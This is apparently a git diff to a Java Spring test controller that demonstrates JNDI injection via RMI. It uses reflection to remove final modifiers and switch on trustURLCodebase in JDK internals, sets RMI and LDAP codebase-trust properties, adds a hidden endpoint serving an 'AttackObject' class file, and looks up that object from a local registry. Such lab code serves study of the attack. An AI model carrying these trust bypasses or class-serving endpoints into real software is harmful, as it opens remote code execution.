@@ -4,6 +4,7 @@ import com.sun.jndi.rmi.registry.*;
 import io.swagger.annotations.*;
 import org.slf4j.*;
 import org.springframework.web.bind.annotation.*;
+import springfox.documentation.annotations.*;
 
 import javax.naming.*;
 import java.io.*;
@@ -58,7 +59,7 @@ public class JNDITestController {
         }
     }
 
-    private static void resetRegistryContext(Boolean trustURLCodebase) throws Exception {
+    private static void resetTrustURLCodebase(Boolean trustURLCodebase) throws Exception {
         Field[] fields = RegistryContext.class.getDeclaredFields();
         for (Field field: fields) {
             if(field.getName().equals("trustURLCodebase")){
@@ -69,6 +70,28 @@ public class JNDITestController {
                 field.setBoolean(null, trustURLCodebase);
             }
         }
+        Class VersionHelper12 = Class.forName("com.sun.naming.internal.VersionHelper12");
+        fields = VersionHelper12.getDeclaredFields();
+        for (Field field: fields) {
+            if(field.getName().equals("trustURLCodebase")){
+                field.setAccessible(true);
+                Field modifiers = Field.class.getDeclaredField("modifiers");
+                modifiers.setAccessible(true);
+                modifiers.setInt(field, field.getModifiers() & ~Modifier.FINAL);
+                field.set(null, trustURLCodebase.toString());
+            }
+        }
+    }
+
+    @ApiIgnore
+    @GetMapping(value = "AttackObject.class")
+    public byte[] attackObject() throws Exception {
+        String classFile ="target/classes/cn/moonlord/test/JNDITestController$AttackObject.class";
+        FileInputStream in = new FileInputStream(new File(classFile));
+        byte[] buffer = new byte[in.available()];
+        in.read(buffer);
+        in.close();
+        return buffer;
     }
 
     @ApiOperation(value="测试用例 A1，启动 RMI 服务端")
@@ -167,8 +190,9 @@ public class JNDITestController {
             logger.info("registry name : " + name);
         }
         System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "false");
+        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "false");
         Context ctx = new InitialContext();
-        resetRegistryContext(false);
+        resetTrustURLCodebase(false);
         Object object = ctx.lookup("rmi://127.0.0.1:" + registryPort + "/naming/attackObject");
         return String.valueOf(object);
     }
@@ -183,8 +207,9 @@ public class JNDITestController {
             logger.info("registry name : " + name);
         }
         System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
+        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
         Context ctx = new InitialContext();
-        resetRegistryContext(true);
+        resetTrustURLCodebase(true);
         Object object = ctx.lookup("rmi://127.0.0.1:" + registryPort + "/naming/attackObject");
         return String.valueOf(object);
     }
